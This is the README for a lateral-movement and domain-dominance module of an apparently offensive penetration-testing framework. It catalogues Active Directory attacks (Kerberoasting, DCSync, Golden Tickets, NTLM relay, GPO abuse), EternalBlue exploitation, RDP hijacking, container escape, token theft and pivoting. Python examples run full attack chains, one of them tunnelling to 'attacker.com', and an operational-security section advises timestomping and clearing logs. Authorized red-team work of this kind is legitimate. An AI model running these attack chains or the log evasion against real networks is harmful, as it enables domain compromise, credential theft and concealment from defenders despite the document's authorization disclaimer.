# Phase 7: Lateral Movement & Domain Dominance

## Overview

Phase 7 implements advanced lateral movement, Active Directory exploitation, privilege escalation, and network pivoting capabilities. This phase enables complete domain dominance and persistent access across enterprise networks.

## Features

### 🎯 Active Directory Exploitation

#### BloodHound Integration
- **Attack Path Analysis**: Automated path finding to Domain Admins
- **Kerberoastable Users**: Enumerate SPNs for offline cracking
- **AS-REP Roastable**: Find users without Kerberos pre-auth
- **Delegation Abuse**: Unconstrained and constrained delegation
- **DCSync Principals**: Enumerate replication rights
- **High-Value Targets**: Domain Admins, Enterprise Admins, Domain Controllers

#### Kerberos Attacks
- **Kerberoasting**: Automated TGS-REP hash extraction
- **AS-REP Roasting**: Extract hashes for users without pre-auth
- **Golden Ticket**: Generate persistent domain admin access (10-year validity)
- **Silver Ticket**: Service-specific ticket generation
- **Pass-the-Ticket**: Inject Kerberos tickets
- **Pass-the-Hash**: NTLM hash authentication
- **Overpass-the-Hash**: Request TGT using NTLM hash

#### DCSync Attack
- **All Users**: Extract entire domain password hashes
- **Specific Users**: Targeted credential extraction
- **Computer Accounts**: DC$ and server$ hashes
- **NTDS.dit Extraction**: Full database dump
- **krbtgt Hash**: Extract for Golden Ticket generation

#### NTLM Relay
- **SMB Relay**: Command execution via relayed auth
- **LDAP Relay**: Privilege escalation and DCSync rights
- **MSSQL Relay**: SQL Server exploitation
- **SOCKS Proxy**: SOCKS4/5 via relayed sessions
- **RBCD**: Resource-based Constrained Delegation

#### GPO Abuse
- **Immediate Tasks**: Execute commands via GPO
- **Local Admin Addition**: Add users to local administrators
- **User Rights Assignment**: Grant SeDebugPrivilege, etc.
- **Startup Scripts**: Deploy malicious scripts
- **Registry Modification**: Modify settings domain-wide

### 🌐 Lateral Movement

#### SMB Exploitation
- **EternalBlue (MS17-010)**: Automated exploitation
- **SMBGhost (CVE-2020-0796)**: Windows 10 1903/1909
- **PsExec**: Authenticated remote execution
- **WMIExec**: WMI-based command execution
- **SMBExec**: Stealthier SMB execution

#### RDP Hijacking
- **Session Enumeration**: List active RDP sessions
- **tscon Hijacking**: Hijack sessions without password
- **Credential Theft**: Extract RDP credentials from memory
- **Sticky Keys Backdoor**: SYSTEM shell at login screen
- **RDP MitM**: Session interception and recording

#### SSH Lateral Movement
- **SSH Key Theft**: Extract private keys
- **SSH Agent Hijacking**: Use loaded keys
- **authorized_keys Modification**: Add public keys
- **SSH Key Spray**: Test keys across network
- **Jump Host Pivoting**: Multi-hop SSH connections

#### Database Hopping
- **SQL Server Links**: Enumerate and abuse linked servers
- **xp_cmdshell**: Enable and execute OS commands
- **PostgreSQL Extensions**: dblink, plpythonu exploitation
- **MongoDB**: JavaScript execution via $where
- **Multi-hop Queries**: OPENQUERY chains

#### Container Escape
- **Privileged Container**: Mount host filesystem
- **Docker Socket**: Escape via exposed socket
- **Kubernetes API**: Service account exploitation
- **Kubelet API**: Unauthenticated access
- **Pod Creation**: Deploy privileged pods

#### Cloud Metadata Abuse
- **AWS**: IAM credential theft from metadata service
- **Azure**: Managed identity token extraction
- **GCP**: Service account credential theft
- **SSRF**: Metadata access via vulnerabilities
- **S3 Enumeration**: List accessible buckets

### ⬆️ Privilege Escalation

#### Kernel Exploits
- **Windows**: CVE-2021-1732, CVE-2020-0787, MS16-032
- **Linux**: PwnKit, Dirty Pipe, Dirty COW, OverlayFS
- **Success Probability**: Exploits ranked by reliability
- **Auto-Download**: Fetch from exploit-db/GitHub

#### Misconfiguration Enumeration
- **SUID Binaries**: Find exploitable setuid programs
- **Sudo Permissions**: Parse sudo -l for abuse
- **Capabilities**: Enumerate cap_setuid+ep binaries
- **Cron Jobs**: World-writable cron scripts
- **NFS Shares**: no_root_squash exploitation
- **Writable PATH**: Hijackable directories

#### Token Manipulation (Windows)
- **Token Enumeration**: List available tokens
- **Token Theft**: Steal from other processes
- **SeDebugPrivilege**: Enable for full access
- **JuicyPotato**: SYSTEM via DCOM
- **PrintSpoofer**: Print Spooler abuse

#### Process Injection (Windows)
- **DLL Injection**: Classic CreateRemoteThread
- **Reflective DLL**: Load from memory
- **Process Hollowing**: RunPE technique
- **APC Injection**: QueueUserAPC method
- **Thread Hijacking**: Hijack existing threads
- **AtomBombing**: Atom table abuse

#### DLL Hijacking
- **Missing DLLs**: Phantom DLL detection
- **Search Order**: DLL load order abuse
- **Proxy DLLs**: Forward to original + payload
- **Side-Loading**: Signed application abuse

### 🔄 Pivoting & Tunneling

#### Port Forwarding
- **Local Forward**: SSH -L tunneling
- **Remote Forward**: SSH -R tunneling
- **Dynamic Forward**: SOCKS proxy via SSH
- **Chisel**: HTTP-based tunneling
- **netsh**: Windows port proxy

#### SOCKS Proxy
- **SOCKS4/5**: Full protocol support
- **SSH Tunneling**: Dynamic port forwarding
- **Proxychains**: Chain multiple proxies
- **Redsocks**: Transparent proxying
- **Metasploit**: SOCKS via meterpreter

#### VPN Establishment
- **OpenVPN**: Full server/client setup
- **WireGuard**: Modern VPN protocol
- **IPsec**: Pre-shared key tunnels
- **Certificate Generation**: Auto PKI setup

#### Route Manipulation
- **Add Routes**: Linux/Windows route addition
- **Metasploit Routes**: Route via sessions
- **IP Forwarding**: Enable on compromised hosts
- **NAT Setup**: Configure MASQUERADE
- **Policy Routing**: Advanced routing rules

#### SSH Tunneling
- **Multi-hop SSH**: ProxyJump chaining
- **SSH VPN**: TUN/TAP tunneling
- **HTTP Proxy**: SSH via corporate proxies
- **Persistent Tunnels**: autossh integration
- **Reverse Tunnels**: Expose internal services

## Installation

### Install Requirements
```bash
pip install -r requirements-phase7.txt
```

### External Tools (Optional)
```bash
# Neo4j for BloodHound
docker run -d -p7474:7474 -p7687:7687 neo4j:latest

# Impacket suite (already in requirements)
# Metasploit framework (system package)
apt-get install metasploit-framework

# BloodHound
wget https://github.com/BloodHoundAD/BloodHound/releases/latest/download/BloodHound-linux-x64.zip
```

## Usage

### Basic Phase 7 Workflow

```python
from core.phase7_engine import Phase7Engine

# Initialize engine
engine = Phase7Engine(domain='corp.local', os_type='windows')

# Execute AD attack chain
await engine.execute_ad_attack_chain(
    initial_user='user@corp.local',
    initial_password='Password123'
)

# Lateral movement campaign
await engine.lateral_movement_campaign(
    targets=['10.0.0.10', '10.0.0.20'],
    credentials={'admin': 'P@ssw0rd'}
)

# Automated privilege escalation
await engine.privilege_escalation_automated('Windows', '10.0.19041')

# Establish pivoting infrastructure
await engine.establish_persistence_tunnels(
    pivot_host='10.0.0.5',
    internal_network='172.16.0.0/16'
)
```

### Active Directory Attack Examples

#### BloodHound Analysis
```python
from active_directory.bloodhound_analyzer import BloodHoundAnalyzer

bh = BloodHoundAnalyzer()
await bh.connect()

# Find path to Domain Admins
paths = await bh.find_shortest_path_to_da('user@corp.local')

# Generate attack plan
plan = await bh.generate_attack_plan('user@corp.local')
```

#### Kerberoasting
```python
from active_directory.kerberos_attacks import KerberosAttacks

kerb = KerberosAttacks('corp.local')

# Automated Kerberoasting
hashes = await kerb.kerberoast_automated('user', 'password')

# Crack with hashcat
await kerb.crack_hashes('hashes.txt', '/usr/share/wordlists/rockyou.txt')
```

#### Golden Ticket
```python
# After DCSync to get krbtgt hash
from active_directory.dcsync import DCSyncAttack

dc = DCSyncAttack('corp.local')
krbtgt = await dc.get_krbtgt_hash()

# Generate Golden Ticket
await kerb.generate_golden_ticket(
    domain_sid='S-1-5-21-123456789-123456789-123456789',
    krbtgt_hash=krbtgt['ntlm_hash'],
    target_user='Administrator'
)
```

### Lateral Movement Examples

#### EternalBlue
```python
from lateral_movement.smb_exploitation import SMBExploitation

smb = SMBExploitation()

# Scan for vulnerable hosts
vulnerable = await smb.scan_for_eternalblue(['192.168.1.0/24'])

# Exploit
for target in vulnerable:
    await smb.exploit_eternalblue(target['target'])
```

#### RDP Session Hijacking
```python
from lateral_movement.rdp_hijacking import RDPHijacking

rdp = RDPHijacking()

# Enumerate sessions
sessions = await rdp.enumerate_rdp_sessions('10.0.0.10', 'admin', 'pass')

# Hijack SYSTEM session
await rdp.hijack_session_tscon('10.0.0.10', session_id=2)
```

#### Database Hopping
```python
from lateral_movement.database_hopping import DatabaseHopping

db = DatabaseHopping()

# Enumerate SQL Server links
links = await db.enumerate_sql_server_links('sql01', 'sa', 'P@ssw0rd')

# Execute via link chain
await db.execute_via_link('sql01', ['sql02', 'sql03'], 'SELECT @@version')
```

### Privilege Escalation Examples

#### Automated Escalation
```python
from privilege_escalation.kernel_exploit_db import KernelExploitDatabase

exploits_db = KernelExploitDatabase()

# Find applicable exploits
exploits = await exploits_db.find_exploits_for_system('Windows', '10.0.19041')

# Execute highest success rate exploit
if exploits:
    await exploits_db.execute_exploit(exploits[0])
```

#### Token Manipulation
```python
from privilege_escalation.token_manipulation import TokenManipulator

tokens = TokenManipulator()

# Find SYSTEM token
token_list = await tokens.enumerate_tokens()
system_token = next(t for t in token_list if 'SYSTEM' in t['user'])

# Steal token
await tokens.steal_token(system_token['pid'])
```

### Pivoting Examples

#### SOCKS Proxy
```python
from pivoting.socks_proxy import SOCKSProxy

socks = SOCKSProxy()

# SSH SOCKS tunnel
await socks.ssh_socks_tunnel('pivot.corp.local', 'root', 1080)

# Configure proxychains
await socks.configure_proxychains([
    {'type': 'socks5', 'host': '127.0.0.1', 'port': 1080}
])
```

#### WireGuard VPN
```python
from pivoting.vpn_establishment import VPNEstablisher

vpn = VPNEstablisher()

# Setup server
keys = await vpn.setup_wireguard_server('wg0', '10.8.0.0/24')

# Connect client
await vpn.connect_wireguard_client(
    keys['public_key'],
    'attacker.com',
    51820
)
```

## MITRE ATT&CK Mapping

### Active Directory
- **T1558**: Steal or Forge Kerberos Tickets
- **T1003.006**: DCSync
- **T1484**: Domain Policy Modification (GPO)
- **T1557**: NTLM Relay

### Lateral Movement
- **T1210**: Exploitation of Remote Services (EternalBlue)
- **T1076**: Remote Desktop Protocol
- **T1021.004**: SSH
- **T1213**: Data from Information Repositories (Databases)

### Privilege Escalation
- **T1068**: Exploitation for Privilege Escalation (Kernel Exploits)
- **T1548**: Abuse Elevation Control Mechanism (SUID, Sudo)
- **T1134**: Access Token Manipulation
- **T1055**: Process Injection

### Pivoting
- **T1090**: Proxy (SOCKS)
- **T1572**: Protocol Tunneling
- **T1573**: Encrypted Channel (VPN)

## Ethical Use & Legal Compliance

⚠️ **WARNING**: Phase 7 contains extremely powerful attack capabilities.

### Legal Requirements
1. **Written Authorization**: Obtain explicit written permission
2. **Scope Definition**: Clearly defined target systems
3. **Time Windows**: Agreed testing periods
4. **Incident Response**: Emergency contact procedures
5. **Data Handling**: Secure credential management

### Prohibited Activities
- ❌ Unauthorized Active Directory attacks
- ❌ Lateral movement outside scope
- ❌ Credential theft without authorization
- ❌ Domain-wide GPO modification in production

### Best Practices
1. **Isolated Lab**: Test in segregated AD environment first
2. **Credential Hygiene**: Secure all extracted credentials
3. **Logging**: Comprehensive activity logging
4. **Cleanup**: Remove GPO modifications, tickets, tunnels
5. **Reporting**: Document all compromised accounts/hosts

## Troubleshooting

### BloodHound Connection Issues
```bash
# Start Neo4j
docker start neo4j
# Default credentials: neo4j/neo4j (change on first login)
```

### Impacket Import Errors
```bash
pip install --upgrade impacket
```

### Kerberos Clock Skew
```bash
# Sync time with DC
sudo ntpdate dc01.corp.local
```

### SMB Signing Errors
```bash
# Check SMB signing status
nmap --script smb-security-mode.nse -p445 <target>
```

## Performance Optimization

### BloodHound Queries
- Use indexes in Neo4j for faster queries
- Limit result sets with LIMIT clause

### Network Scanning
- Adjust thread counts based on network size
- Use smaller CIDR ranges for faster scans

### Pivoting Bandwidth
- Compress tunneled traffic when possible
- Use UDP-based VPNs for better performance

## Security Considerations

### Operational Security
1. **Timestomping**: Modify file timestamps
2. **Log Evasion**: Clear or modify logs
3. **Traffic Encryption**: Encrypt all C2 tunnels
4. **Credential Rotation**: Change passwords post-assessment

### Detection Risks
- **High**: DCSync, Golden Ticket, EternalBlue
- **Medium**: Kerberoasting, NTLM Relay, RDP Hijacking
- **Low**: SSH lateral movement, Database hopping

## Support

For issues or questions:
- Check `logs/` directory for detailed error logs
- Review MITRE ATT&CK techniques for detection methods
- Consult BloodHound documentation for AD attack paths

## License

**For authorized security testing only.** Unauthorized use is illegal and unethical.
